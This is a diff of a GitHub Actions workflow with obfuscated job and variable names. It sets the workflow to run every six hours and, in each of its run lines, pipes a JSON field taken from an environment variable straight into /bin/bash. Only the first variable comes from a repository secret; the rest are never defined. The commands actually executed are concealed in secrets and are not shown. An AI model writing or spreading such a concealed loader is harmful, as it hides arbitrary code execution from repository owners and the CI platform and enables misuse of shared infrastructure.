@@ -3,34 +3,29 @@ name: naizida4561
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 2/6 * * *'
-
+    - cron: '57 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: naizida4561
         env:
-          fg552: ${{ secrets.fg552 }}
+          j80: ${{ secrets.j80 }}
         run: |
-          echo $fg552 | jq -r .w39 | /bin/bash
-          echo $lz35728 | jq -r .mul1268 | /bin/bash
-          echo $gv16 | jq -r .ptomr326 | /bin/bash
-          echo $eqv702 | jq -r .ifi76 | /bin/bash
-          echo $zx0077 | jq -r .zh86 | /bin/bash
-          echo $q38 | jq -r .jiaa4265 | /bin/bash
-          echo $zkyyd4 | jq -r .flwm69272 | /bin/bash
-          echo $j78366 | jq -r .qkuku82 | /bin/bash
-          echo $aay8783 | jq -r .v277 | /bin/bash
-          echo $mz60 | jq -r .y24691 | /bin/bash
-          echo $tim9 | jq -r .qllm06 | /bin/bash
-          echo $drl5701 | jq -r .nq09594 | /bin/bash
-          echo $ax23 | jq -r .yzkqq3 | /bin/bash
-          echo $fioe9 | jq -r .eaku17 | /bin/bash
-          echo $lzdnv61 | jq -r .bmc37 | /bin/bash
-          echo $uywbv46 | jq -r .tw6 | /bin/bash
-          echo $ir75 | jq -r .td11584 | /bin/bash
-          echo $xth35782 | jq -r .juxs1717 | /bin/bash
-          echo $ni53 | jq -r .vyuwt3 | /bin/bash
+          echo $j80 | jq -r .brdfp96 | /bin/bash
+          echo $qlucl1 | jq -r .xy3 | /bin/bash
+          echo $m9 | jq -r .lksm83117 | /bin/bash
+          echo $qzimh5 | jq -r .sn10842 | /bin/bash
+          echo $d45866 | jq -r .urn03 | /bin/bash
+          echo $twjfy668 | jq -r .lljl61458 | /bin/bash
+          echo $jkt26 | jq -r .cd763 | /bin/bash
+          echo $kor36 | jq -r .v37951 | /bin/bash
+          echo $qs0 | jq -r .g10 | /bin/bash
+          echo $x56333 | jq -r .fcnk34344 | /bin/bash
+          echo $nvnhf64894 | jq -r .itvx50062 | /bin/bash
+          echo $lvrde14431 | jq -r .imjz36 | /bin/bash
+          echo $em324 | jq -r .rv55 | /bin/bash
+          echo $z938 | jq -r .ajr55 | /bin/bash
 
